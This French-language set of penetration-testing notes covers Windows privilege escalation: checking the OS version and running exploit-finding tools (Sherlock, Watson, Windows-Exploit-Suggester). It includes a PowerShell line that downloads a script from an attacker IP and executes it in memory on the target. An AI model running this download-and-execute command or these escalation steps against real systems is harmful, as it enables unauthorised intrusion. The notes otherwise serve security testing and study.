---
public: true
---
## Version de Windows

```shell
# Si on souhaite les informations du système d'exploitation uniquement on pourra utiliser cette commande
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

[environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

On trouvera sur ce site la version exacte de Windows en fonction de la version du noyau remonté par les commandes suivantes

[Liste des Versions Windows](https://en.wikipedia.org/wiki/Windows_10_version_history)

## Escalade de privilèges

Selon la version du système d'exploitation, on pourra utiliser un des outils suivants pour trouver des exploits qui pourraient fonctionner sur la machine cible :

- Avant Windows Server 2016 : <https://github.com/rasta-mouse/Sherlock>
- Windows Server 2016 et supérieur : <https://github.com/rasta-mouse/Watson>

On peut aussi tenter <https://github.com/AonCyberLabs/Windows-Exploit-Suggester>

### Sherlock (versions anciennes de windows)

** Remarque** : Sherlock affiche une liste de vulnérabilité avec un `VulnStatus` qui peut avoir la valeur `Not Vulnerable`. J'ai pu constater que même si il était marqué `Not Vulnerable`, certains exploits fonctionnent tout de même.... Cela peut donc être intéressant de tenter même d'autres exploits qui serait considérés comme "Non Applicable" (Attention à la stabilité du système !)

```powershell
iex ((New-Object Net.WebClient).DownloadString('http://10.10.15.96/Sherlock.ps1'))
Import-Module .\Sherlock.ps1
Find-AllVulns
```

### Windows Exploit suggester

#### Installation

```shell
curl -LO https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
# dépendances
sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
sudo tar -xf setuptools-2.0.tar.gz
pushd setuptools-2.0/
sudo python2.7 setup.py install
popd

sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
sudo tar -xf xlrd-1.0.0.tar.gz
pushd xlrd-1.0.0/
sudo python2.7 setup.py install
popd
# mise à jour de la DB
sudo python2.7 windows-exploit-suggester.py --update
```

```shell
# exécuter sur la cible 
# > systeminfo > info.txt 
sudo python2.7 windows-exploit-suggester.py -d 2023-11-12-mssb.xls -i /tmp/info.txt   
```
